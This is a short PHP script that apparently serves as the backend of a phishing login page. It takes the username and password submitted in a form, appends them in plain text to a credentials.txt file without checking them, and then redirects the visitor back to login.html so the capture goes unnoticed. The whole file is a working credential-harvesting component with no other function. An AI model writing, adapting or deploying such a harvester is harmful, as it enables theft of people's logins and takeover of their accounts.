<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];
    
    // Open a file to save the credentials
    $file = fopen("credentials.txt", "a");
    
    // Write the username and password to the file
    fwrite($file, "Username: " . $username . " - Password: " . $password . "\n");
    
    // Close the file
    fclose($file);
    
    // Redirect back to the login page
    header("Location: login.html");
    exit();
} else {
    // If accessed directly, redirect to the login page
    header("Location: login.html");
    exit();
}
?>
